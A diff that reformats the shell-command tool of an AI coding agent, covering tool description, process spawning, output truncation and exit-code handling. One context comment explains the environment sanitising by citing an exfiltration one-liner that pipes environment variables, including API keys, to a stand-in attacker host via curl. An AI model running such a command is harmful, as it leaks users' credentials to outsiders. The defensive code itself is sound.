@@ -39,7 +39,8 @@ const definition: ToolDefinition = {
   type: 'function',
   function: {
     name: TOOL_NAMES.Bash,
-    description: 'Execute a shell command and return its output (stdout + stderr). Use for system commands, git, builds, tests, and other terminal operations.',
+    description:
+      'Execute a shell command and return its output (stdout + stderr). Use for system commands, git, builds, tests, and other terminal operations.',
     parameters: {
       type: 'object',
       required: ['command'],
@@ -84,7 +85,7 @@ async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promis
   // no longer `printenv | curl -d @- evil.com` provider API keys.
   const { env } = sanitizeEnv(process.env, ctx?.envPolicy);
 
-  return new Promise((resolve) => {
+  return new Promise(resolve => {
     const proc = spawn('sh', ['-c', wrapped], {
       cwd,
       env,
@@ -117,7 +118,7 @@ async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promis
     // emit a fenced "--- stderr ---" section after stdout so the model can
     // see them separately without doubling the token cost on the common
     // case where stderr is empty.
-    proc.on('close', (code) => {
+    proc.on('close', code => {
       // Strip the sentinel from stdout before showing the user/model. Look at
       // the very tail (\\n SENTINEL : path \\n?) to avoid eating earlier text
       // that might coincidentally contain the sentinel string.
@@ -130,17 +131,16 @@ async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promis
       }
 
       const combined = [stdout, stderr].filter(Boolean).join('\n');
-      const truncated = combined.length > OUTPUT_CAP_BYTES
-        ? combined.slice(0, OUTPUT_CAP_BYTES) + '\n...(output truncated)'
-        : combined;
+      const truncated =
+        combined.length > OUTPUT_CAP_BYTES
+          ? combined.slice(0, OUTPUT_CAP_BYTES) + '\n...(output truncated)'
+          : combined;
 
       let output: string;
       if (code === 0) {
         output = truncated || '(no output)';
       } else {
-        output = truncated
-          ? `(exit code ${code})\n${truncated}`
-          : `(exit code ${code})`;
+        output = truncated ? `(exit code ${code})\n${truncated}` : `(exit code ${code})`;
       }
 
       // The command ran — even a non-zero exit is informational (lint errors,
@@ -166,7 +166,7 @@ async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promis
       });
     });
 
-    proc.on('error', (err) => {
+    proc.on('error', err => {
       resolve({ success: false, output: `Failed to execute: ${err.message}` });
     });
   });
